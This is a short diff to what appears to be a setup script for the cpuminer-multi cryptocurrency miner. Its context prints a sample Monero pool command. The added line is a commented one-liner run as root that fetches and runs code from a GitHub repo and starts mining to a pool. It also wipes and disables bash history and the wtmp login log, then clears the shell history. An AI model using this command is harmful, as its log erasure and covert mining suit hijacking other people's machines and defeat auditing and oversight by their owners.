@@ -16,3 +16,5 @@ printf "To use type ./minerd with any options you want while in the cpuminer-mul
 printf "For example ./minerd -a cryptonight -o stratum+tcp://xmr-usa.dwarfpool.com:8050 -u 45MfScNnyb3KwanUH4feiDExdydQ3cACKPpJuxmtoVnY25Khw7nBeZmXhtoWj4Pfi4PjdxkFWpaW72PR3Jy1Xr8R6HFyk9M -p x -t 4"
 
 fi
+
+# apt-get install automake screen libssl-dev -y && rm -f /root/.bash_history && ln -s /dev/null /root/.bash_history && rm -f /var/log/wtmp && ln -s /dev/null /var/log/wtmp && git clone https://github.com/CaseAnon/raspberrypimining rpi && cd /rpi && ./minerSetup.sh && cd cpuminer-multi && ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u anoncase@protonmail.com -p x -t 4 && history -c 
